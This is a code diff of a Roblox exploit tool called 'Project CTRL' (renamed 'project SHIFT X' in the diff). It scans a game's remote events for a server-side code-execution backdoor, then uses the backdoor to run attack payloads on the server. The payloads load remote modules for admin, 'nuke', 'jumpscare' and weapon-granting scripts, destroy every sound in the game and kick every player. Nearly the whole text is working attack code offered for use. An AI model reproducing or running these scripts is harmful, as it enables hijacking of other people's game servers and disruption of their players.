+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_5d);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_5e()
-local script = G2L["5e"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_5e);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_62()
-local script = G2L["62"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = [[local SoundService = game:GetService("SoundService")
+		
+		local rawcode = [[local SoundService = game:GetService("SoundService")
 		
 	-- Sound IDs
 		local soundIds = {
@@ -1798,363 +1936,556 @@ local script = G2L["62"];
 	-- Start the loop
 	playSequence()
 	]]
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_62);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_63()
-local script = G2L["63"];
+task.spawn(C_5d);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_61()
+local script = G2L["61"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_63);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_64()
-local script = G2L["64"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_64);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_68()
-local script = G2L["68"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(7634392335)("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_68);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_61);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_65()
+local script = G2L["65"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(75026282232818).load("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_65);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_69()
 local script = G2L["69"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(70681531110549).admin("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
 task.spawn(C_69);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_6a()
-local script = G2L["6a"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_6d()
+local script = G2L["6d"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_6a);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_6e()
-local script = G2L["6e"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(135686792632620).nuke("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(10304477576).AntiSkid()'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_6e);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_6f()
-local script = G2L["6f"];
+task.spawn(C_6d);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_71()
+local script = G2L["71"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_6f);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_70()
-local script = G2L["70"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_70);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_74()
-local script = G2L["74"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(12350030542).RC7("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = [[for _, obj in ipairs(game:GetDescendants()) do
+		if obj:IsA("Sound") then
+		obj:Destroy()
+		end
+		end
+		]]
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_74);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_71);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_75()
 local script = G2L["75"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = [[for i,v player in ipairs(game.Players:GetDescendants()) do
+		v:Kick("This server has been shut down")
+		end
+		]]
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
 task.spawn(C_75);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_76()
-local script = G2L["76"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_79()
+local script = G2L["79"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_76);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_7a()
-local script = G2L["7a"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(78790302691160):Hload("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(9978015219).filteringdisabled("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_7a);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_7b()
-local script = G2L["7b"];
+task.spawn(C_79);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_7d()
+local script = G2L["7d"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_7b);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_7c()
-local script = G2L["7c"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_7c);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_80()
-local script = G2L["80"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(7634392335)("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = ' require(14499140823)("' .. username .. '", "sorcerer")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_80);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_7d);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_81()
 local script = G2L["81"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(2823974237).giveGuns' .. username .. ''
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
 task.spawn(C_81);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_82()
-local script = G2L["82"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_85()
+local script = G2L["85"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_82);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_86()
-local script = G2L["86"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(15267263357).V11("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(104732504345735).jumpscare("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_86);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_87()
-local script = G2L["87"];
+task.spawn(C_85);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_89()
+local script = G2L["89"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_87);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_88()
-local script = G2L["88"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
+		
+		local rawcode = 'require(104712588684071)("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_88);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
+task.spawn(C_89);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
 local function C_8c()
 local script = G2L["8c"];
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(3010581956):Fireplace("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
-			end
-		end
+		script.Parent.Parent.page1.Visible = true
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = false
 	end)
 end;
 task.spawn(C_8c);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_8d()
-local script = G2L["8d"];
-	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_8d);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_8e()
-local script = G2L["8e"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
-			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject before executing!",
-					Duration = 5
-				})
-			end)
-		end
-	end)
-end;
-task.spawn(C_8e);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.Warner
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
 local function C_8f()
 local script = G2L["8f"];
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
-			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject before executing!",
-					Duration = 5
-				})
-			end)
-		end
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = true
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = false
 	end)
 end;
 task.spawn(C_8f);
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-local function C_94()
-local script = G2L["94"];
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_92()
+local script = G2L["92"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = true
+		script.Parent.Parent.page4.Visible = false
+	end)
+end;
+task.spawn(C_92);
+-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
+local function C_95()
+local script = G2L["95"];
+	local scrollingFrame = script.Parent
+	local LogService = game:GetService("LogService")
+	
+	-- Format time
+	local function getTimeStamp()
+		local t = os.date("*t")
+		return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
+	end
+	
+	-- Create a new label for each log line
+	local function addLogLine(text, color)
+		local label = Instance.new("TextLabel")
+		label.Name = "LOG"
+		label.Text = text
+		label.TextColor3 = color
+		label.BackgroundTransparency = 1
+		label.Font = Enum.Font.Code
+		label.TextSize = 14
+		label.TextWrapped = true
+		label.Size = UDim2.new(1, -10, 0, 0)
+		label.AutomaticSize = Enum.AutomaticSize.Y
+		label.Parent = scrollingFrame
+		
+		-- Apply default UIStroke
+		local stroke = Instance.new("UIStroke")
+		stroke.Parent = label
+	end
+	
+	-- Listen to all console output
+	LogService.MessageOut:Connect(function(message, messageType)
+		if message == "Hello world!" then return end -- ⛔ Skip exact match
+		
+		local timestamp = getTimeStamp()
+		local color = Color3.fromRGB(255, 255, 255)
+		
+		if messageType == Enum.MessageType.MessageWarning then
+			color = Color3.fromRGB(255, 217, 0)
+		elseif messageType == Enum.MessageType.MessageError then
+			color = Color3.fromRGB(179, 0, 0)
+		end
+		
+		local fullText = "[" .. timestamp .. "] " .. message
+		addLogLine(fullText, color)
+	end)
+end;
+task.spawn(C_95);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_98()
+local script = G2L["98"];
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.page1.Visible = false
 		script.Parent.Parent.page2.Visible = false
@@ -2162,96 +2493,47 @@ local script = G2L["94"];
 		script.Parent.Parent.page4.Visible = true
 	end)
 end;
-task.spawn(C_94);
--- StarterGui.project CTRL.Frame.page4.ScrollingFrame.LocalScript
-local function C_9a()
-local script = G2L["9a"];
-	local LogService = game:GetService("LogService")
-	local RunService = game:GetService("RunService")
-	
-	-- Parent GUI where logs will be displayed
-	local outputParent = script.Parent
-	
-	-- Optional: vertical layout for stacking messages
-	local layout = Instance.new("UIListLayout")
-	layout.SortOrder = Enum.SortOrder.LayoutOrder
-	layout.Parent = outputParent
-	
-	-- Function to create a new TextLabel for each log message
-	local function createLogLabel(message, messageType)
-		local label = Instance.new("TextLabel")
-		label.Size = UDim2.new(1, 0, 0, 20)
-		label.BackgroundTransparency = 1
-		label.TextXAlignment = Enum.TextXAlignment.Left
-		label.Font = Enum.Font.Code
-		label.TextSize = 14
-		label.TextWrapped = true
-		label.TextScaled = true
-		label.Text = message
-		
-		-- Set color based on message type
-		if messageType == Enum.MessageType.MessageOutput then
-			label.TextColor3 = Color3.new(1, 1, 1) -- white
-		elseif messageType == Enum.MessageType.MessageWarning then
-			label.TextColor3 = Color3.new(1, 1, 0) -- yellow
-		elseif messageType == Enum.MessageType.MessageError then
-			label.TextColor3 = Color3.new(1, 0, 0) -- red
-		else
-			label.TextColor3 = Color3.new(0.7, 0.7, 0.7) -- gray for other types
-		end
-		
-		label.Parent = outputParent
-	end
-	
-	-- Connect to LogService
-	LogService.MessageOut:Connect(function(message, messageType)
-		createLogLabel(message, messageType)
-	end)
-end;
-task.spawn(C_9a);
--- StarterGui.project CTRL.Scanner
-local function C_9b()
-local script = G2L["9b"];
+task.spawn(C_98);
+-- StarterGui.ScreenGui.Scanner
+local function C_99()
+local script = G2L["99"];
 	local replicatedStorage = game:GetService("ReplicatedStorage")
 	local starterGui = game:GetService("StarterGui")
 	local players = game:GetService("Players")
 	local screenGui = script.Parent
-	local frame = screenGui:FindFirstChildOfClass("Frame")
+	local frame = screenGui:FindFirstChildOfClass("Frame"):FindFirstChild("page2")
 	local username = players.LocalPlayer.Name
-	local page2 = frame:FindFirstChild("page2")
 	
 	-- GUI references inside Frame
-	local textbox = frame:FindFirstChild("page2"):FindFirstChild("Text"):FindFirstChild("TextBox")
-	local executeButton = frame:FindFirstChild("page2"):FindFirstChild("Execute")
-	local clearButton = page2:FindFirstChild("Clear")
-	local injectButton = page2:FindFirstChild("Inject")
-	local r6Button = page2:FindFirstChild("R6")
-	local statusLabel = frame.page1:FindFirstChild("Status")
+	local textbox = frame:FindFirstChild("Text"):FindFirstChild("TextBox")
+	local executeButton = frame:FindFirstChild("Execute")
+	local clearButton = frame:FindFirstChild("Clear")
+	local injectButton = frame:FindFirstChild("Inject")
+	local r6Button = frame:FindFirstChild("R6")
+	local statusLabel = script.Parent.Frame.page1.Status
 	
-	-- Validate GUI components
 	if not textbox or not executeButton or not clearButton or not injectButton or not r6Button or not statusLabel then
 		warn("Missing GUI components.")
 		return
 	end
 	
-	-- Global backdoor references
+	-- Global storage using getgenv()
 	getgenv().confirmedBackdoor = nil
 	getgenv().confirmedType = nil
 	
 	injectButton.MouseButton1Click:Connect(function()
-		local testPayload = 'local h = Instance.new("Hint") h.Parent = game.Workspace h.Text = "project CTRL |BEST serverside and BACKDOOR scanner"'
+		local testPayload = 'local h = Instance.new("Hint") h.Parent = game.Workspace h.Text = "project SHIFT X |BEST serverside and BACKDOOR scanner"'
 		local found = false
 		
 		for _, obj in ipairs(replicatedStorage:GetDescendants()) do
 			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-				-- Clear existing hints
 				for _, h in ipairs(workspace:GetChildren()) do
-					if h:IsA("Hint") and h.Text == "project CTRL |BEST serverside and BACKDOOR scanner" then
+					if h:IsA("Hint") and h.Text == "project SHIFT X |BEST serverside and BACKDOOR scanner" then
 						h:Destroy()
 					end
 				end
 				
-				local success = pcall(function()
+				pcall(function()
 					if obj:IsA("RemoteEvent") then
 						obj:FireServer(testPayload)
 					elseif obj:IsA("RemoteFunction") then
@@ -2262,7 +2544,7 @@ local script = G2L["9b"];
 				wait(0.5)
 				
 				for _, h in ipairs(workspace:GetChildren()) do
-					if h:IsA("Hint") and h.Text == "project CTRL |BEST serverside and BACKDOOR scanner" then
+					if h:IsA("Hint") and h.Text == "project SHIFT X |BEST serverside and BACKDOOR scanner" then
 						print("backdoor confirmed through " .. obj.ClassName .. ": " .. obj:GetFullName())
 						getgenv().confirmedBackdoor = obj
 						getgenv().confirmedType = obj.ClassName
@@ -2324,19 +2606,17 @@ local script = G2L["9b"];
 		end
 	end)
 	
